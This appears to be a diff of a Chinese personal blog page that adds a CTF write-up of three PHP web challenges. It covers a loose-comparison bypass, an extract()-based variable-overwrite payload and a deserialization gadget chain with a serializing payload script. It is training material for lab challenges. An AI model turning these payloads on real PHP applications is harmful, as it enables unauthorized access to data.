@@ -6,18 +6,22 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://blog.warrenli.fun">
-  <title>categories | Warrenli&#39;s blog</title>
+  <title>年CTF | Warrenli&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="categories">
-<meta property="og:url" content="https://blog.warrenli.fun/categories/index.html">
+  <meta name="description" content="除夕 前面弱相等，后面强相等。用浮点数类型绕过。 ?year&#x3D;2022. 初三12345678910111213141516&lt;?phperror_reporting(0);extract($_GET);include &quot;flag.php&quot;;highlight_file(__FILE__);$_&#x3D;function($__,$___)&#123;    retur">
+<meta property="og:type" content="article">
+<meta property="og:title" content="年CTF">
+<meta property="og:url" content="https://blog.warrenli.fun/2025/04/02/%E5%B9%B4CTF/index.html">
 <meta property="og:site_name" content="Warrenli&#39;s blog">
+<meta property="og:description" content="除夕 前面弱相等，后面强相等。用浮点数类型绕过。 ?year&#x3D;2022. 初三12345678910111213141516&lt;?phperror_reporting(0);extract($_GET);include &quot;flag.php&quot;;highlight_file(__FILE__);$_&#x3D;function($__,$___)&#123;    retur">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-03-23T11:31:14.000Z">
-<meta property="article:modified_time" content="2025-03-23T11:31:14.812Z">
+<meta property="og:image" content="https://blog.warrenli.fun/2025/04/02/%E5%B9%B4CTF/1741741205556-01e69f9b-8ab6-461c-ab57-ffa3b1a732aa.png">
+<meta property="article:published_time" content="2025-04-02T06:51:00.000Z">
+<meta property="article:modified_time" content="2025-04-02T06:51:00.039Z">
 <meta property="article:author" content="Warrenli">
 <meta property="article:tag" content="网安，web">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://blog.warrenli.fun/2025/04/02/%E5%B9%B4CTF/1741741205556-01e69f9b-8ab6-461c-ab57-ffa3b1a732aa.png">
   
     <link rel="alternative" href="/atom.xml" title="Warrenli&#39;s blog" type="application/atom+xml">
   
@@ -141,27 +145,59 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="page-" class="article article-type-page " itemscope itemprop="blogPost">
+            <article id="post-年CTF" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      categories
+      年CTF
     </h1>
   
 
         
-        <a href="/categories/index.html" class="archive-article-date">
-  	<time datetime="2025-03-23T11:31:14.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-03-23</time>
+        <a href="/2025/04/02/%E5%B9%B4CTF/" class="archive-article-date">
+  	<time datetime="2025-04-02T06:51:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2025-04-02</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        
+        <hr>
+<h1 id="除夕"><a href="#除夕" class="headerlink" title="除夕"></a>除夕</h1><p><img src="/2025/04/02/%E5%B9%B4CTF/1741741205556-01e69f9b-8ab6-461c-ab57-ffa3b1a732aa.png"></p>
+<p>前面弱相等，后面强相等。用浮点数类型绕过。</p>
+<p>?year&#x3D;2022.</p>
+<h1 id="初三"><a href="#初三" class="headerlink" title="初三"></a>初三</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$__</span>,<span class="variable">$___</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$__</span>==<span class="variable">$___</span>?<span class="variable">$___</span>:<span class="variable">$__</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="variable">$$__</span>(<span class="variable">$_</span>(<span class="variable">$_GET</span>&#123;</span><br><span class="line">    <span class="variable">$___</span></span><br><span class="line">&#125;[<span class="variable">$____</span>]&#123;</span><br><span class="line">    <span class="variable">$_____</span></span><br><span class="line">&#125;(),<span class="variable">$flag</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>题目这样看起来很不舒服，美化一下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$__</span>,<span class="variable">$___</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$__</span>==<span class="variable">$___</span>?<span class="variable">$___</span>:<span class="variable">$__</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="variable">$$__</span>( <span class="variable">$_</span>(<span class="variable">$_GET</span>&#123;<span class="variable">$___</span>&#125;[<span class="variable">$____</span>]&#123;<span class="variable">$_____</span>&#125;(),<span class="variable">$flag</span>) );</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>考的变量覆盖，同时用_这种变量来干扰。</p>
+<p>$_函数会比较两个参数，根据是否相等来决定返回哪个，这里是若相等。</p>
+<p>很明显我们要返回flag，就要相等。</p>
+<p>$<em>GET{$</em><strong>}[$_<em><strong>]{$</strong></em></strong>}()这个相当于 n[x]<a href>y</a>。看来我们要找一个函数，使其返回值与字符串弱相等。</p>
+<p>对于$$__，我们只要让其能打印即可，这里用print_r。</p>
+<p>payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=print_r&amp;__=a&amp;___=n&amp;____=x&amp;_____=y&amp;n[x][y]=phpinfo</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h1 id="初六"><a href="#初六" class="headerlink" title="初六"></a>初六</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">happy2year</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$key</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$argv</span></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;key, <span class="keyword">array</span>(<span class="variable">$method</span>,<span class="variable">$argv</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getSecret</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$key</span>=<span class="variable">$key</span>?<span class="variable">$key</span>:<span class="variable language_">$this</span>-&gt;key;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">createSecret</span>(<span class="variable">$key</span>);    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">createSecret</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$this</span>-&gt;key.<span class="variable">$this</span>-&gt;secret);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">        <span class="variable">$arg</span>=<span class="string">&quot;get&quot;</span>.<span class="variable">$arg</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$arg</span> = <span class="variable">$flag</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$arg</span>,<span class="variable">$argv</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$arg</span>.<span class="variable">$argv</span>);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$secret</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">secret</span>().<span class="variable">$this</span>-&gt;secret);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$data</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line"><span class="variable">$obj</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$obj</span>)&#123;</span><br><span class="line">    <span class="variable">$secret</span> = <span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">getSecret</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;你提交的key是&quot;</span>.<span class="variable">$key</span>.<span class="string">&quot;\n生成的secret是&quot;</span>.<span class="variable">$secret</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>看到最终flag是通过__get触发的。__get里面给不存在的变量赋值，触发set(arg是”get”，argv是$flag)，直接return flag了。</p>
+<p>现在想触发get，要么调用不存在的变量，要么调用私有变量。这里__invoke明显调用私有变量。</p>
+<p>触发__invoke需要实例被当作函数调用，乍一看没有，其实call_user_func就有，它的第一个参数就是函数名，而刚好key可控，我们只要让key&#x3D;$this即可。</p>
+<p>接着往上推就顺了：</p>
+<p>payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">happy2year</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$secret</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$key</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                <span class="variable language_">$this</span>-&gt;key=<span class="variable language_">$this</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">happy2year</span>()));</span><br></pre></td></tr></table></figure>
+
+
       
 
       
@@ -240,7 +276,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://blog.warrenli.fun/categories/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://blog.warrenli.fun/2025/04/02/%E5%B9%B4CTF/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -252,6 +288,16 @@
 </article>
 
   
+<nav id="article-nav">
+  
+  
+    <a href="/2025/04/02/%E6%96%B0%E6%89%8B%E6%9D%AF/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">新手杯</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
 
 <aside class="wrap-side-operation">
     <div class="mod-side-operation">
@@ -273,7 +319,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    目录，不存在的…
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%99%A4%E5%A4%95"><span class="toc-number">1.</span> <span class="toc-text">除夕</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%9D%E4%B8%89"><span class="toc-number">2.</span> <span class="toc-text">初三</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%9D%E5%85%AD"><span class="toc-number">3.</span> <span class="toc-text">初六</span></a></li></ol>
                     </div>
                 </span>
             </div>
@@ -315,7 +361,7 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
+		isPost: true,
 		isArchive: false,
 		isTag: false,
 		isCategory: false,
